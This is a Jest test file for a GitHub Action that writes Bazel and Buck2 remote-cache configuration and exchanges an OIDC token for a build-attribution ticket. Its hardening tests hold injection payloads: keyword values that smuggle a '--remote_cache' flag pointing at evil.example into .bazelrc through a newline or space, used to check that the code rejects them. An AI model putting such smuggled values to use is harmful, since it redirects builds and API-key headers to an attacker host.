import { jest } from '@jest/globals'
import { fs, vol } from 'memfs'

jest.unstable_mockModule('fs', () => ({
  __esModule: true,
  default: fs
}))

// The module being tested should be imported dynamically. This ensures that the
// mocks are used in place of any actual dependencies.
const { run } = await import('../src/main.ts')

const makeCore = (inputs: Record<string, string>) => {
  return {
    getInput: (name: string, options?: { required: boolean }) => {
      if (name in inputs) {
        return inputs[name]
      }
      if (options?.required === true) {
        throw new Error(`Input ${name} is required but was not provided`)
      }
      return ''
    },
    setFailed: jest.fn(),
    info: jest.fn(),
    warning: jest.fn(),
    getIDToken: jest.fn(async () => 'header.payload.signature'),
    setSecret: jest.fn()
  }
}

const defaultInputs = {
  api_key: 'demo-key',
  account: 'demo-account',
  prefix: 'demo-prefix'
}

const defaultBazelOutput = `build --remote_cache=grpcs://cas-demo-prefix.build-faster.nativelink.net
build --remote_header=x-nativelink-api-key=demo-key
build --bes_backend=grpcs://bes-demo-prefix.build-faster.nativelink.net
build --bes_header=x-nativelink-api-key=demo-key
build --bes_results_url=https://app.nativelink.com/a/demo-account/build
build --remote_timeout=600`

const defaultBuckOutput = `[buck2_re_client]
action_cache_address = cas-demo-prefix.build-faster.nativelink.net:443
cas_address = cas-demo-prefix.build-faster.nativelink.net:443
tls = true
http_headers = x-nativelink-api-key:demo-key
`

describe('main.ts', () => {
  beforeEach(() => {
    vol.reset()
    vol.mkdirSync(process.cwd(), { recursive: true })
  })

  afterEach(() => {
    jest.resetAllMocks()
  })

  const writesBazelRc = async (
    inputs: Record<string, string>,
    output: string
  ) => {
    const core = makeCore(inputs)
    await run(core)
    expect(core.setFailed).not.toHaveBeenCalled()
    const expected: Record<string, string> = {}
    expected[`${process.cwd()}/.bazelrc`] = output
    expect(vol.toJSON()).toEqual(expected)
  }

  it('Writes bazel config', async () => {
    writesBazelRc(defaultInputs, defaultBazelOutput)
  })

  it('Writes bazel config for dev', async () => {
    writesBazelRc(
      { ...defaultInputs, environment: 'dev' },
      `build --remote_cache=grpcs://cas-demo-prefix.uc1.scdev.nativelink.net
build --remote_header=x-nativelink-api-key=demo-key
build --bes_backend=grpcs://bes-demo-prefix.uc1.scdev.nativelink.net
build --bes_header=x-nativelink-api-key=demo-key
build --bes_results_url=https://web-dev.uc1.scdev.nativelink.net/a/demo-account/build
build --remote_timeout=600`
    )
  })

  it('Writes bazel config with custom cache', async () => {
    writesBazelRc(
      { ...defaultInputs, cache_url: 'http://cache-url-foo' },
      defaultBazelOutput.replace(
        'grpcs://cas-demo-prefix.build-faster.nativelink.net',
        'http://cache-url-foo'
      )
    )
  })

  it('Writes bazel config with custom bes', async () => {
    writesBazelRc(
      { ...defaultInputs, bes_url: 'http://bes-url-foo' },
      defaultBazelOutput.replace(
        'grpcs://bes-demo-prefix.build-faster.nativelink.net',
        'http://bes-url-foo'
      )
    )
  })

  it('Writes bazel config with custom bes_results_url', async () => {
    writesBazelRc(
      { ...defaultInputs, bes_results_url: 'http://bes-results-url-foo' },
      defaultBazelOutput.replace(
        'https://app.nativelink.com/a/demo-account/build',
        'http://bes-results-url-foo'
      )
    )
  })

  // Remote execution is opt-in and the scheduler address is not derivable from
  // the account prefix, so there is no default: supplying one adds the flag,
  // omitting one leaves a cache-only build rather than a guessed hostname that
  // fails at build time.
  it('adds remote_executor only when a scheduler_url is given', async () => {
    writesBazelRc(
      { ...defaultInputs, scheduler_url: 'http://scheduler-url-foo' },
      defaultBazelOutput + '\nbuild --remote_executor=http://scheduler-url-foo'
    )
  })

  it('omits remote_executor entirely when no scheduler_url is given', async () => {
    writesBazelRc(defaultInputs, defaultBazelOutput)
  })

  it('Writes bazel config with custom remote timeout', async () => {
    writesBazelRc(
      { ...defaultInputs, remote_timeout: '100' },
      defaultBazelOutput.replace('600', '100')
    )
  })

  it('Writes bazel config with existing config', async () => {
    fs.writeFileSync('.bazelrc', 'build --existing_config=foo')
    writesBazelRc(
      defaultInputs,
      'build --existing_config=foo\n' + defaultBazelOutput
    )
  })

  const badSettings = async (
    extraInputs: Record<string, string>,
    errorMsg: string
  ) => {
    const core = makeCore({
      ...defaultInputs,
      ...extraInputs
    })
    await run(core)
    expect(core.setFailed).toHaveBeenCalledWith(errorMsg)
    const expected: Record<string, string | null> = {}
    expected[`${process.cwd()}`] = null
    expect(vol.toJSON()).toEqual(expected)
  }

  it('Has bad environment', async () => {
    await badSettings({ environment: 'wrong' }, 'Invalid environment: wrong')
  })

  it('Goes boom on non-error', async () => {
    const core = {
      ...makeCore(defaultInputs),
      getInput: () => {
        throw 'Boom!'
      }
    }
    await run(core)
    expect(core.setFailed).toHaveBeenCalledWith(
      'An unknown error occurred: "Boom!"'
    )
  })

  test.each(['bazel', 'buck2'])(
    '%s: goes boom on non-error',
    async (build_system) => {
      const oldFileSync = fs.readFileSync
      fs.readFileSync = () => {
        throw 'bad file'
      }
      try {
        const core = makeCore({ ...defaultInputs, build_system })
        await run(core)
        expect(core.setFailed).toHaveBeenCalledWith(
          'An unknown error occurred: "bad file"'
        )
      } finally {
        fs.readFileSync = oldFileSync
      }
    }
  )

  it('Fails on bad build system', async () => {
    const core = makeCore({
      ...defaultInputs,
      build_system: 'not-a-build-system'
    })
    await run(core)
    expect(core.setFailed).toHaveBeenCalledWith(
      'Unknown build system: not-a-build-system'
    )
  })

  const writesBuckConfig = async (
    inputs: Record<string, string>,
    output: string
  ) => {
    const core = makeCore(inputs)
    await run(core)
    expect(core.setFailed).not.toHaveBeenCalled()
    const expected: Record<string, string> = {}
    expected[`${process.cwd()}/.buckconfig`] = output
    expect(vol.toJSON()).toEqual(expected)
  }

  it('Writes buck2 config', async () => {
    writesBuckConfig(
      {
        ...defaultInputs,
        build_system: 'buck2'
      },
      defaultBuckOutput
    )
  })

  it('Writes buck2 config with existing', async () => {
    fs.writeFileSync(
      '.buckconfig',
      `[cells]
root = .
`
    )
    writesBuckConfig(
      {
        ...defaultInputs,
        build_system: 'buck2'
      },
      `${defaultBuckOutput}
[cells]
root = .
`
    )
  })
})

describe('build attribution', () => {
  const ticketId = 'ZmFrZS10aWNrZXQtaWQtZm9yLXRlc3RpbmctMDEyMzQ1Ng'
  const okTicket = {
    ticketId,
    keyword: `nl_ticket:${ticketId}`,
    repository: 'acme-corp/monorepo',
    account: 'demo-account'
  }

  const stubFetch = (
    response: Partial<Response> & { json?: () => unknown }
  ) => {
    const spy = jest.fn(async () => response as unknown as Response)
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    ;(globalThis as any).fetch = spy
    return spy
  }

  afterEach(() => {
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    delete (globalThis as any).fetch
    vol.reset()
  })

  it('appends the ticket keyword to the bazelrc', async () => {
    vol.reset()
    vol.mkdirSync(process.cwd(), { recursive: true })
    const fetchSpy = stubFetch({ ok: true, json: async () => okTicket })
    const core = makeCore({
      ...defaultInputs,
      attribution_url: 'https://github-app.example/'
    })

    await run(core)

    expect(fetchSpy).toHaveBeenCalledWith(
      'https://github-app.example/v1/ci/token-exchange',
      expect.objectContaining({ method: 'POST' })
    )
    expect(vol.readFileSync('.bazelrc', 'utf-8')).toContain(
      `build --bes_keywords=nl_ticket:${ticketId}`
    )
    expect(core.setFailed).not.toHaveBeenCalled()
  })

  it('sends the OIDC token in the body, never the URL', async () => {
    vol.reset()
    vol.mkdirSync(process.cwd(), { recursive: true })
    const fetchSpy = stubFetch({ ok: true, json: async () => okTicket })

    await run(
      makeCore({
        ...defaultInputs,
        attribution_url: 'https://github-app.example'
      })
    )

    const [url, init] = fetchSpy.mock.calls[0] as [string, RequestInit]
    expect(url).not.toContain('?')
    expect(JSON.parse(init.body as string)).toEqual({
      token: 'header.payload.signature'
    })
  })

  it('never writes the ticket id into the bazelrc verbatim without the prefix', async () => {
    vol.reset()
    vol.mkdirSync(process.cwd(), { recursive: true })
    stubFetch({ ok: true, json: async () => okTicket })

    const core = makeCore({
      ...defaultInputs,
      attribution_url: 'https://github-app.example'
    })
    await run(core)

    // The id reaches the file only as part of the keyword flag, and the id must
    // never be echoed to the log: Actions logs are public on open-source repos
    // and this is a six-hour bearer credential.
    for (const call of (core.info as jest.Mock).mock.calls) {
      expect(String(call[0])).not.toContain(ticketId)
    }
  })

  it('does not attribute when no url is configured', async () => {
    vol.reset()
    vol.mkdirSync(process.cwd(), { recursive: true })
    const fetchSpy = stubFetch({ ok: true, json: async () => okTicket })

    await run(makeCore(defaultInputs))

    expect(fetchSpy).not.toHaveBeenCalled()
    expect(vol.readFileSync('.bazelrc', 'utf-8')).not.toContain('bes_keywords')
  })

  // This runs inside the customer's build. Our failure must cost them a
  // verified identity, never a green pipeline.
  it.each([
    ['refused', { ok: false, status: 403, json: async () => ({}) }],
    ['unavailable', { ok: false, status: 502, json: async () => ({}) }],
    ['empty ticket', { ok: true, json: async () => ({ ticketId: '' }) }]
  ])('survives a %s exchange without failing the build', async (_name, res) => {
    vol.reset()
    vol.mkdirSync(process.cwd(), { recursive: true })
    stubFetch(res)
    const core = makeCore({
      ...defaultInputs,
      attribution_url: 'https://github-app.example'
    })

    await run(core)

    expect(core.setFailed).not.toHaveBeenCalled()
    expect(core.warning).toHaveBeenCalled()
    expect(vol.readFileSync('.bazelrc', 'utf-8')).not.toContain('bes_keywords')
  })

  it('explains a missing id-token permission rather than reporting a raw error', async () => {
    vol.reset()
    vol.mkdirSync(process.cwd(), { recursive: true })
    stubFetch({ ok: true, json: async () => okTicket })
    const core = makeCore({
      ...defaultInputs,
      attribution_url: 'https://github-app.example'
    })
    core.getIDToken = jest.fn(async () => {
      throw new Error('Unable to get ACTIONS_ID_TOKEN_REQUEST_URL env variable')
    })

    await run(core)

    expect(core.setFailed).not.toHaveBeenCalled()
    expect((core.warning as jest.Mock).mock.calls[0][0]).toContain(
      'id-token: write'
    )
  })

  it('fails the build when the caller opted into strictness', async () => {
    vol.reset()
    vol.mkdirSync(process.cwd(), { recursive: true })
    stubFetch({ ok: false, status: 403, json: async () => ({}) })
    const core = makeCore({
      ...defaultInputs,
      attribution_url: 'https://github-app.example',
      fail_on_attribution_error: 'true'
    })

    await run(core)

    expect(core.setFailed).toHaveBeenCalledWith(
      'NativeLink build attribution failed'
    )
  })

  // The audience is checked server-side, so a caller pointing at a deployment
  // with a different configured audience must be able to override the default.
  it('honours an explicit audience', async () => {
    vol.reset()
    vol.mkdirSync(process.cwd(), { recursive: true })
    stubFetch({ ok: true, json: async () => okTicket })
    const core = makeCore({
      ...defaultInputs,
      attribution_url: 'https://github-app.example',
      attribution_audience: 'nativelink.internal'
    })

    await run(core)

    expect(core.getIDToken).toHaveBeenCalledWith('nativelink.internal')
  })

  it('warns that buck2 cannot carry a ticket instead of ignoring the input', async () => {
    vol.reset()
    vol.mkdirSync(process.cwd(), { recursive: true })
    const fetchSpy = stubFetch({ ok: true, json: async () => okTicket })
    const core = makeCore({
      ...defaultInputs,
      build_system: 'buck2',
      attribution_url: 'https://github-app.example'
    })

    await run(core)

    expect(fetchSpy).not.toHaveBeenCalled()
    expect((core.warning as jest.Mock).mock.calls[0][0]).toContain('buck2')
  })
})

describe('build attribution hardening', () => {
  const ticketId = 'ZmFrZS10aWNrZXQtaWQtZm9yLXRlc3RpbmctMDEyMzQ1Ng'
  const okTicket = {
    ticketId,
    keyword: `nl_ticket:${ticketId}`,
    repository: 'acme-corp/monorepo',
    account: 'demo-account'
  }

  const stubFetch = (response: unknown) => {
    const spy = jest.fn(async () => response as Response)
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    ;(globalThis as any).fetch = spy
    return spy
  }

  const fresh = () => {
    vol.reset()
    vol.mkdirSync(process.cwd(), { recursive: true })
  }

  afterEach(() => {
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    delete (globalThis as any).fetch
    vol.reset()
  })

  // The id is a six-hour bearer credential and it lands in .bazelrc, where
  // --announce_rc, `bazel build -s` or a plain `cat .bazelrc` echoes it into a
  // log that is public on any open-source repository. Not printing it ourselves
  // only covers our own lines; setSecret covers everyone's.
  it('masks the ticket for the whole job', async () => {
    fresh()
    stubFetch({ ok: true, json: async () => okTicket })
    const core = makeCore({
      ...defaultInputs,
      attribution_url: 'https://github-app.example'
    })

    await run(core)

    expect(core.setSecret).toHaveBeenCalledWith(ticketId)
  })

  // The keyword is written verbatim into .bazelrc and Bazel is last-flag-wins,
  // so a newline in a server-controlled value injects flags that override the
  // ones above it — including --remote_cache, while our API-key header lines
  // still apply.
  it.each([
    [
      'a newline injecting bazelrc lines',
      'nl_ticket:x\nbuild --remote_cache=grpcs://evil.example'
    ],
    [
      'a space injecting another flag',
      'nl_ticket:x --remote_cache=grpcs://evil.example'
    ],
    ['null', null],
    ['a number', 12345],
    ['empty', '']
  ])('refuses %s as a keyword', async (_name, keyword) => {
    fresh()
    stubFetch({ ok: true, json: async () => ({ ...okTicket, keyword }) })
    const core = makeCore({
      ...defaultInputs,
      attribution_url: 'https://github-app.example'
    })

    await run(core)

    const bazelrc = vol.readFileSync('.bazelrc', 'utf-8') as string
    expect(bazelrc).not.toContain('evil.example')
    expect(bazelrc).not.toContain('bes_keywords')
    expect(core.setFailed).not.toHaveBeenCalled()
    expect(core.warning).toHaveBeenCalled()
  })

  it('refuses a malformed ticket id even when the keyword looks fine', async () => {
    fresh()
    stubFetch({ ok: true, json: async () => ({ ...okTicket, ticketId: null }) })
    const core = makeCore({
      ...defaultInputs,
      attribution_url: 'https://github-app.example'
    })

    await run(core)

    expect(core.setSecret).not.toHaveBeenCalled()
    expect(vol.readFileSync('.bazelrc', 'utf-8')).not.toContain('bes_keywords')
  })

  // Soft failure has to survive the exchange itself, not just getIDToken —
  // fetch rejects on DNS failure, connection refused and timeouts.
  it.each([
    [
      'a rejected fetch',
      () => {
        throw new Error('ECONNREFUSED')
      }
    ],
    ['a non-JSON body', undefined]
  ])('survives %s without failing the build', async (_name, thrower) => {
    fresh()
    if (thrower) {
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      ;(globalThis as any).fetch = jest.fn(async () => {
        thrower()
      })
    } else {
      stubFetch({
        ok: true,
        json: async () => {
          throw new Error('Unexpected token < in JSON')
        }
      })
    }
    const core = makeCore({
      ...defaultInputs,
      attribution_url: 'https://github-app.example'
    })

    await run(core)

    expect(core.setFailed).not.toHaveBeenCalled()
    expect(core.warning).toHaveBeenCalled()
  })

  // `true`, `TRUE`, `yes` and `1` all plainly mean yes. Silently reading them
  // as no would disable a safety flag someone believed they had set.
  it.each(['true', 'TRUE', 'True', 'yes', '1', 'on', ' true '])(
    'treats %j as opting into strict failure',
    async (value) => {
      fresh()
      stubFetch({ ok: false, status: 403, json: async () => ({}) })
      const core = makeCore({
        ...defaultInputs,
        attribution_url: 'https://github-app.example',
        fail_on_attribution_error: value
      })

      await run(core)

      expect(core.setFailed).toHaveBeenCalledWith(
        'NativeLink build attribution failed'
      )
    }
  )

  it.each(['false', 'no', '0', '', 'off'])(
    'treats %j as leaving failure soft',
    async (value) => {
      fresh()
      stubFetch({ ok: false, status: 403, json: async () => ({}) })
      const core = makeCore({
        ...defaultInputs,
        attribution_url: 'https://github-app.example',
        fail_on_attribution_error: value
      })

      await run(core)

      expect(core.setFailed).not.toHaveBeenCalled()
    }
  )
})
